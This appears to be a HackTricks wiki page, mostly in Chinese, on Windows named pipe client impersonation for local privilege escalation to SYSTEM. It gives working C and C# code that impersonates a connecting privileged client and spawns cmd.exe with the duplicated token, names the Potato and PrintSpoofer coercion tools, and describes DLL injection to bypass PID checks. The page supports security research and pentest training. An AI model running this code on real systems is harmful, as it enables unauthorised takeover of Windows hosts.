# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe 客户端冒充是一种本地提权原语，允许命名管道服务器线程采用连接到它的客户端的安全上下文。实际上，能够以 SeImpersonatePrivilege 权限运行代码的攻击者可以强迫有特权的客户端（例如，一个 SYSTEM 服务）连接到攻击者控制的管道，调用 ImpersonateNamedPipeClient，将得到的令牌复制为主令牌（primary token），并以该客户端（通常是 NT AUTHORITY\SYSTEM）的身份创建进程。

本页专注于核心技术。有关将 SYSTEM 强制连接到你的管道的端到端漏洞利用链，请参见下面引用的 Potato 家族页面。

## 要点
- 创建一个命名管道： \\.\pipe\<random> 并等待连接。
- 使有特权的组件连接到该管道（spooler/DCOM/EFSRPC/etc.）。
- 从管道读取至少一条消息，然后调用 ImpersonateNamedPipeClient。
- 从当前线程打开模拟令牌，调用 DuplicateTokenEx(TokenPrimary)，并使用 CreateProcessWithTokenW/CreateProcessAsUser 获取 SYSTEM 进程。

## 要求与关键 API
- 调用进程/线程通常需要的权限：
  - SeImpersonatePrivilege，用于成功冒充连接的客户端以及使用 CreateProcessWithTokenW。
  - 或者，在冒充 SYSTEM 之后，你可以使用 CreateProcessAsUser，这可能需要 SeAssignPrimaryTokenPrivilege 和 SeIncreaseQuotaPrivilege（当你正在冒充 SYSTEM 时这些权限已满足）。
- 常用核心 API：
  - CreateNamedPipe / ConnectNamedPipe
  - ReadFile/WriteFile（在冒充之前必须至少读取一条消息）
  - ImpersonateNamedPipeClient 和 RevertToSelf
  - OpenThreadToken, DuplicateTokenEx(TokenPrimary)
  - CreateProcessWithTokenW 或 CreateProcessAsUser
- 冒充级别：要在本地执行有用操作，客户端必须允许 SecurityImpersonation（许多本地 RPC/命名管道客户端的默认值）。客户端可以在打开管道时通过 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION 降低该级别。

## 最小 Win32 工作流程 (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- If ImpersonateNamedPipeClient returns ERROR_CANNOT_IMPERSONATE (1368), ensure you read from the pipe first and that the client didn’t restrict impersonation to Identification level.
- Prefer DuplicateTokenEx with SecurityImpersonation and TokenPrimary to create a primary token suitable for process creation.

## .NET 快速示例
在 .NET 中，NamedPipeServerStream 可以通过 RunAsClient 进行模拟。模拟成功后，复制线程令牌并创建一个进程。
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
这些技术会强制特权服务连接到你的 named pipe，从而让你模拟它们：
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (DLL Injection, API Hooking, PID Validation Bypass)
即便对 named-pipe 做了加固的服务，仍然可以通过对受信任客户端进行检测/篡改来劫持。像 [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) 这样的工具会把一个 helper DLL 放到客户端，代理其流量，让你在 SYSTEM 服务消费之前篡改特权 IPC。

### Inline API hooking inside trusted processes
- 将 helper DLL 注入任意客户端（OpenProcess → CreateRemoteThread → LoadLibrary）。
- DLL Detours `ReadFile`、`WriteFile` 等，仅在 `GetFileType` 返回 `FILE_TYPE_PIPE` 时生效，将每个缓冲区/元数据复制到控制管道，允许你编辑/丢弃/重放，然后恢复原始 API。
- 将合法客户端变成类似 Burp 的代理：暂停 UTF-8/UTF-16/raw payloads，触发错误路径，重放序列，或导出 JSON 跟踪。

### Remote client mode to defeat PID-based validation
- 将 DLL 注入到 allow-listed 客户端，然后在 GUI 中选择该 pipe 与对应 PID。
- DLL 在受信任进程内发起 `CreateFile`/`ConnectNamedPipe` 并把 I/O 中继回你，因此服务端仍会看到合法的 PID/映像。
- 绕过依赖 `GetNamedPipeClientProcessId` 或已签名映像检查的过滤器。

### Fast enumeration and fuzzing
- `pipelist` 枚举 `\\.\pipe\*`，显示 ACLs/SIDs，并将条目转发到其他模块以便立即探测。
- pipe client/message composer 可以连接到任意名称并构建 UTF-8/UTF-16/raw-hex payloads；导入已捕获的 blobs，变异字段并重发，以寻找反序列化器或未认证的命令动词。
- helper DLL 可以托管一个 loopback TCP listener，使工具/模糊测试器能够通过 Python SDK 远程驱动该 pipe。
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
将 TCP bridge 与 VM 快照恢复结合，用于对脆弱的 IPC 解析器进行崩溃测试。

### Operational considerations
- Named pipes are low-latency; long pauses while editing buffers can deadlock brittle services.
- Overlapped/completion-port I/O coverage is partial, so expect edge cases.
- Injection is noisy and unsigned, so treat it as a lab/exploit-dev helper rather than a stealth implant.

## Troubleshooting and gotchas
- 你必须在调用 ImpersonateNamedPipeClient 之前至少从 pipe 中读取一条消息；否则会收到 ERROR_CANNOT_IMPERSONATE (1368)。
- 如果客户端以 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION 连接，server 无法完全 impersonate；通过 GetTokenInformation(TokenImpersonationLevel) 检查 token 的 impersonation level。
- CreateProcessWithTokenW 要求调用方具有 SeImpersonatePrivilege。如果因此失败并返回 ERROR_PRIVILEGE_NOT_HELD (1314)，在已经 impersonated SYSTEM 之后改用 CreateProcessAsUser。
- 如果你对管道进行了加固，确保你的 pipe 的 security descriptor 允许目标 service 连接；默认情况下，\\.\pipe 下的 pipes 根据 server 的 DACL 可被访问。

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
